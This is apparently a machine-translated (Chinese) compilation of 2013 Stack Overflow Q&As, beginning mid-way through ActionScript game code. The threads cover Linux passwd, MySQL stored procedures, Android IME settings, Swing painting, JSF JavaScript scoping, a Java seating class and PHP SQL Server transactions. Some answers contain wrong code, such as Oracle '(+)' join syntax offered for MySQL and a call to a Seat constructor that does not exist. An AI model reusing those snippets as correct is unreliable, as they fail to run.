            purgeEnemy(targetEnemy);
        }

        private function purgeEnemy(targetEnemy:Enemy):void
        {
            targetEnemy.removeEventListener(Enemy.PURGE_EVENT, purgeLaserHandler);
            try
            {
                var i:int;
                for (i = 0; i < enemies.length; i++)
                {
                    if (enemies[i].name == targetEnemy.name)
                    {
                        enemies.splice(i, 1);
                        enemiesLayer.removeChild(targetEnemy);
                        i = enemies.length;
                    }
                }
            }
            catch(e:Error)
            {
                trace("Failed to delete enemy!", e);
            }
        }

        private function newHitTest(laser:Laser):void
        {
            for each (var enemy:Enemy in enemies)
            {
                if (enemy.status != "Dead" && enemy.hitTest(new Point(laser.x, laser.y)))
                {
                    enemy.destroy();
                    purgeLaser(laser);
                }
            }
        }

        private function checkElapsed(event:Event):void
        {
            timePrevious = timeCurrent;
            timeCurrent = getTimer();
            elapsed = (timeCurrent - timePrevious) * 0.001;
        }

        private function update():void
        {
            //trace(enemies.length, lasers.length);

            for each (var enemy:Enemy in enemies)
            {
                enemy.update();
            }

            for each (var laser:Laser in lasers)
            {
                laser.update();
                newHitTest(laser);
            }

            makeEnemies();
        }
        //addapted from "Shoot"
    }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T19:15:03.417

哇哦，解决这个问题的一个非常简单的方法就是启用多点触控。

```
 Starling.multitouchEnabled = true; 
```

但是，如果我还没有触摸屏幕来控制角色，当我按下右下角的按钮时，这仍然会导致我的角色跳到屏幕底部的问题......没什么大不了的，但看起来会更好如果这没有发生。

# linux - bash：更改我自己的密码（不使用 root）

> ID：15825985
> 
> 赞同：2
> 
> 时间：2013-04-05T04:36:26.377
> 
> 标签：linux, bash, passwords

通常 chpasswd 在设置用户密码方面做得很好。

有没有办法让非特权用户更改自己的密码？

我有兴趣为此编写一个 gtk 前端，最好它还需要用户的旧密码。

* * *

```
Change $user password?

      Old password [         ]

      new password [         ]
new password again [         ]

[cancel]               [apply] 
```

* * *

寻找

```
$command
$enter:oldpass
$enter:newpass
password updated 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-05T04:42:54.423

当然有，这里是[linux密码的教程](http://www.cyberciti.biz/faq/linux-set-change-password-how-to/)

解决方案是

```
Task: Set or Change User Password

Type passwd command as follows to change your own password:
$ passwd
Output:

Changing password for vivek
(current) UNIX password:
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully

The user is first prompted for his/her old password, if one is present. This password is then encrypted and compared against the stored password. The user has only one chance to enter the correct password. The super user is permitted to bypass this step so that forgotten passwords may be changed.

A new password is tested for complexity. As a general guideline, passwords should consist of 6 to 8 characters including one or more from each of following sets:

    Lower case alphabetics
    Upper case alphabetics
    Digits 0 thru 9
    Punctuation marks 
```

# mysql - MySQL 存储过程说在 select 语句中未定义别名

> ID：15825986
> 
> 赞同：1
> 
> 时间：2013-04-05T04:36:34.813
> 
> 标签：mysql, select, stored-procedures, alias

我有以下语句，它会产生此错误。显然，select 语句第一行中的别名“R”没有声明，但它就在语句的末尾。有人有想法么？

**#1327 - 未声明的变量：R**

```
 CREATE PROCEDURE `get_series_completion`(IN team1_id INT, IN team2_id INT, IN round_shortname VARCHAR(5))
BEGIN
    DECLARE num_games_total, num_games_played INT;

    SELECT COUNT(*) INTO num_games_played, R.games_per_series INTO num_games_total
    FROM (
        SELECT game_id
        FROM team_games
        WHERE team_id IN (team1_id, team2_id)
        GROUP BY game_id
            HAVING COUNT(*) = 2
            AND SUM(standing = 0) = 0
    ) AS S, rounds AS R ON R.round_shortname = round_shortname;

    SELECT num_games_played/num_games_total;
END$$ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:39:40.107

您应该在 into 子句之前选择所有列，您的查询应该是：

```
SELECT COUNT(*), R.games_per_series INTO num_games_played, num_games_total
    FROM (
        SELECT game_id
        FROM team_games
        WHERE team_id IN (team1_id, team2_id)
        GROUP BY game_id
            HAVING COUNT(*) = 2
            AND SUM(standing = 0) = 0
    ) AS S 
    LEFT OUTER JOIN rounds AS R ON R.round_shortname = round_shortname; 
```

或者

```
SELECT COUNT(*), R.games_per_series INTO num_games_played, num_games_total
    FROM (
        SELECT game_id
        FROM team_games
        WHERE team_id IN (team1_id, team2_id)
        GROUP BY game_id
            HAVING COUNT(*) = 2
            AND SUM(standing = 0) = 0
    ) AS S, rounds AS R 
    WHERE R.round_shortname(+) = round_shortname; -- implicit left outer join 
```

# android - 打开设置屏幕以激活输入法

> ID：15825987
> 
> 赞同：10
> 
> 时间：2013-04-05T04:36:39.590
> 
> 标签：android, input

我写了一个自定义输入法（软键盘）。[我可以根据这篇文章](https://stackoverflow.com/a/5723339/292233)检查它是否启用。现在，如果它已启用（但不是当前的 IME），我可以调用`imeManager.showInputMethodPicker();`它显示启用的 IME 列表，以便用户可以选择我的。

但是，如果我的 IME 未在系统设置中启用，我宁愿将用户直接带到系统设置屏幕，以便他可以启用我的 IME（我记得 Swiftkey 在安装后会这样做）。

如何打开此特定设置屏幕？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-04-05T05:14:16.147

你可以打开安卓设置。使用下面的代码

```
import android.provider.Settings; 
ctx.startActivity(new Intent(Settings.ACTION_INPUT_METHOD_SETTINGS)); 
```

# java - 为什么我在尝试调用paintComponent 时会收到错误消息？

> ID：15825988
> 
> 赞同：1
> 
> 时间：2013-04-05T04:36:44.737
> 
> 标签：java, swing, jbutton, custom-component, paintcomponent

我的班级名为`UI`extends `RoundButton`，如下所示：

```
public class RoundButton extends JButton {

    public RoundButton(String label) {
        super(label);
        this.setContentAreaFilled(false);
        Dimension size = this.getPreferredSize();
        size.height = size.width = Math.max(size.height, size.width);
        this.setPreferredSize(size);
    }

    @Override
    protected void paintComponent(Graphics g) {
        if(!GameState.getIfComplete()) { // If the game is not complete or has just started
            this.setBorder(null);
            g.setColor(Color.BLACK);
            g.fillRect(0, 0, this.getSize().width, this.getSize().height);
            if(this.getModel().isArmed()) {
               g.setColor(Color.RED);
            }else {
                g.setColor(Color.GREEN);
            }
            g.fillOval(0,0,this.getSize().width-1,this.getSize().height-1);
            super.paintComponent(g);
        }else {
            this.setBorder(null);
            g.setColor(Color.BLACK);
            g.fillRect(0, 0, this.getSize().width, this.getSize().height);
            if(this.getModel().isArmed()) {
               g.setColor(Color.BLUE);
            }else {
                g.setColor(Color.BLUE);
            }
            g.fillOval(0,0,this.getSize().width-1,this.getSize().height-1);
            super.paintComponent(g); 
        }
    }
} 
```

里面`UI`有一个名为的方法`disableAllButtons`，如下所示：

```
public void disableAllButtons() {
    int count =0 ;
    while(count <= buttons.length-1) {
        buttons[count].setEnabled(false);
        buttons[count].paintComponent(Graphics g); // GENERATES AN ERROR
        // where buttons[count] = new RoundButton()
        count++;  
    }
} 
```

从我尝试调用的这种方法中，我在课堂上`paintComponent`覆盖了。`RoundButton`但我得到一个错误：

```
')' expected
';' expected
 not a statement
 cannot find symbol
 symbol: variable Graphics
 location: class UI 
```

当我导入`java.awt.Graphics`课程时。

这是为什么 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:41:06.603

看电话`buttons[count].paintComponent(Graphics g)`...

首先，你永远不应该给`paintComponent`自己打电话，你应该让它`RepaintManager`处理。改为使用`repaint`。

其次，`Graphics g`不是一个有效的参数，它是一个减速。

查看

*   [执行自定义绘画](http://docs.oracle.com/javase/tutorial/uiswing/painting/)
*   [在 AWT 和 Swing 中绘画](http://www.oracle.com/technetwork/java/painting-140037.html)

有关 Swing 和绘画的详细信息。

另外......在你的绘画方法中调用`this.setBorder(null);`是一个非常非常糟糕的主意。这将触发一个新的重绘请求，一遍又一遍地发布在事件调度线程上……你明白了。它会消耗你的CPU

# jquery - 当一个包含 JS 代码的复合组件被多次渲染时，JS 只对最后一个组件起作用

> ID：15825989
> 
> 赞同：0
> 
> 时间：2013-04-05T04:36:52.740
> 
> 标签：jquery, jsf, jsf-2, primefaces, composite-component

我有一个使用 PrimeFaces`<p:selectOneMenu>`定义的复合组件：

```
<p:selectOneMenu id="inOut" onchange="inOutChanged()">
  ..
</p:selectOneMenu> 
```

然后我有一个 JavaScript 文件，它作为定义 `inOutChanged()`函数的组件的一部分包含在内，例如

```
function inOutChanged() {
  var inOut = $({cc.clientId}:inOut);
  if(inOut.val() == "INC") {
    slider.addClass("includedInRange");
  }
} 
```

当页面上只有一个时，此复合组件可以正常工作。问题是我需要在页面上有 4 个。因此，当我更改一个复合组件的选择时，它正在更改最后一个组件的滑块类。我相信这是因为实际上`inOutChanged()`页面中定义了 4 个函数。

有没有办法确定函数的范围或唯一地命名它，这样它们就不会互相踩踏？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T12:05:21.253

您的具体问题是因为您`slider`在全局范围内重新声明并重新分配了相同的 JavaScript 变量。您需要将声明移动`slider`到函数内部。

重新声明完全相同的函数并没有什么害处，但效率低下而且不是[DRY](http://en.wikipedia.org/wiki/Don%27t_repeat_yourself)。您应该将该函数移动到它自己的`.js`文件中并使用`<h:outputScript>`它来包含它。JSF 最终只会将它包含一次。然后，相应地更改函数以将变量作为参数。

像这样的东西

```
<h:outputScript library="composite" name="some.js" target="head" />
...
<h:panelGroup id="...">
    <p:selectOneMenu ... onchange="inOutChanged(this)">
        ...
    </p:selectOneMenu>
    ...
    <p:slider ... />
</h:panelGroup> 
```

里面有这个`/resources/composite/some.js`（前提是`/resoruces/composite`包含你的复合组件 XHTML 文件）

```
function inOutChanged(menuElement) {
    var $menu = $(menuElement);
    if ($menu.val() == "INC") {
        $menu.parent().find(".ui-slider").addClass("includedInRange");
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T05:09:53.267

您应该`$(this)`在更改事件侦听器中使用选择器：

```
$(".inOut").change(function(){
    var sel = $(this).find('option:selected').text();
    if(sel == 'INC') {
        //find slider and add class
    }
}); 
```

请注意，我在组件范围之外绑定了 onchange 事件侦听器，并根据附加的 CSS 类找到了组件。这可以在`$(document).ready()`.

当然，您可以在 JS 函数中使用客户端 ID，也可以将该函数绑定到组件的属性。

# java - 实现从一个类到另一个类的方法？

> ID：15825990
> 
> 赞同：0
> 
> 时间：2013-04-05T04:36:58.257
> 
> 标签：java, eclipse

我正在为班级的飞机座位安排制作程序，我最终制作了两种`toString`方法，但是当我运行该程序时`toString`，我的飞机班中的方法使某些东西无法具体工作：

```
str= str + seats[i][j].toString(); 
```

我相信简单地删除`toString`座位类中的方法并以某种方式将其放回飞机类`toString`方法可以解决问题或使其更简单。怎么了？

### 飞机等级：

```
public class Airplane 
{
  private Seat [ ] [ ] seats;
  public static final int FIRST_CLASS = 1;
  public static final int ECONOMY = 2;
  private static final int FC_ROWS = 5;
  private static final int FC_COLS = 4;
  private static final int ECONOMY_ROWS = 5;
  private static final int ECONOMY_COLS = 6;

  public Airplane() 
  {
    seats  = new Seat[FC_ROWS][ECONOMY_COLS]; 
  }
  public String toString()
  {
    String str = "";
    for (int i=0; i<FC_ROWS; i++) {
      for (int j=0; j<ECONOMY_COLS; j++) 
      {
        str= str + seats[i][j].toString();
      }
      str = str + "\n";
    }
    return str;
  }   

} 
```

### 座位等级：

```
public class Seat 
{
  private int seatType;
  private boolean isReserved;
  public static final int WINDOW = 1;
  public static final int AISLE = 2;
  public static final int CENTER = 3;

  public Seat(int inSeatType)
  {
    seatType = inSeatType;
    isReserved = false;
  }
  public int getSeatType()
  {
    return seatType;
  }

  public void reserveSeat()
  {
    isReserved = true;
  }
  public boolean isAvailable()
  {
    if (!isReserved)
    {
      return true;
    }
    else return false; 
  }
  public String toString()
  {
    if(isReserved == false)
    {
      return "*";
    }
    else return "";
  }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:42:57.833

`seats`好像没有`Seat`'实例。

添加此代码：

```
for (int i=0; i<FC_ROWS; i++) {
    for (int j=0; j<ECONOMY_COLS; j++) 
    {
        seats[i][j] = new Seat();
    }
} 
```

在此之下：

```
seats  = new Seat[FC_ROWS][ECONOMY_COLS]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T04:43:50.933

*   在`Seat.toString`你应该打印一个`" "`not `""`。
*   你的数组是`FC_ROWS`by `ECONOMY_COLS`，所以你没有创建所有的座位。您可能应该有两个阵列（一个用于 FC，一个用于经济），因为`FC_ROWS != ECONOMY_ROWS`.
*   您实际上并没有`Seat`在构造函数中创建 s 。使用嵌套循环来创建它们，否则你会得到一个`NullPointerException`. 创建数组不会创建数组中包含的对象。
    *   当您在 Airplane 构造函数中创建座位时，使用`if`语句来确定座位是否应该是 Window、Aisle 等。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-05T04:40:30.493

我认为 in ，如果没有保留`Seat::toString`，您的意思是返回（一个空格）。`" "`

# php - 无论如何在提交 TRANSACTION 之前获取主键？

> ID：15825993
> 
> 赞同：0
> 
> 时间：2013-04-05T04:37:13.867
> 
> 标签：php, sql-server, transactions

实际上我想到了这样的场景：
假设我们正在管理一个存储许多书籍的图书馆。
我们的图书馆网络应用程序允许用户将书籍添加到书架上。
该数据库有两个表，书籍和作者。架构是这样的：

```
CREATE TABLE Books
(book_id int NOT NULL IDENTITY(1,1),
book_name nvarchar(100) NOT NULL,
author_id int NOT NULL,
PRIMARY KEY (book_id),
FOREIGN KEY ( author_id ) REFERENCES Authors(author_id),)

CREATE TABLE Authors
(author_id int NOT NULL IDENTITY(1,1),
author_name nvarchar(100) NOT NULL,
PRIMARY KEY (author_id)) 
```

假设请求将获取作者姓名和书名以将书存储在书架上。
如果没有这样的作者，它将自动生成作者条目。但我希望这个操作成为一个事务。（如果出现问题，我希望一切都回滚。）
我可以在像这样结束事务之前获取主键吗？

```
$server_name = "s3";
$connection_info = array( "Database"=>"bis_testing", "UID"=>"bisuser", "PWD"=>"111");
$conn = sqlsrv_connect( $server_name, $connection_info);

sqlsrv_begin_transaction( $conn )

$sql = "INSERT INTO Author(author_name)
       values
       (?);";

$author_name = 'Dr. Pro';
$stmt1 = sqlsrv_query( $conn, $sql, array($brand_name));
**// get author primary key to $author_pk**

$sql = "INSERT INTO Book(book_name, author_id)
       values
       (?,?);";

$book_name = 'Writing that works';
$stmt2 = sqlsrv_query( $conn, $sql, array($book_name, $author_pk));

if ($stmt1 && $stmt2) {
    echo 'done';
} 
```

如果没有，我应该如何做这项工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:58:23.250

我看不到像在 MySQL 中那样获取最后插入 id 的方法，但是您可以从 SQL Server 获取最后插入的 id，如下所述：[获取插入行标识的最佳方法？](https://stackoverflow.com/questions/42648/best-way-to-get-identity-of-inserted-row)

您还可以查看一个存储过程来执行您需要执行的操作，尽管我不知道您将如何使用这些函数调用它。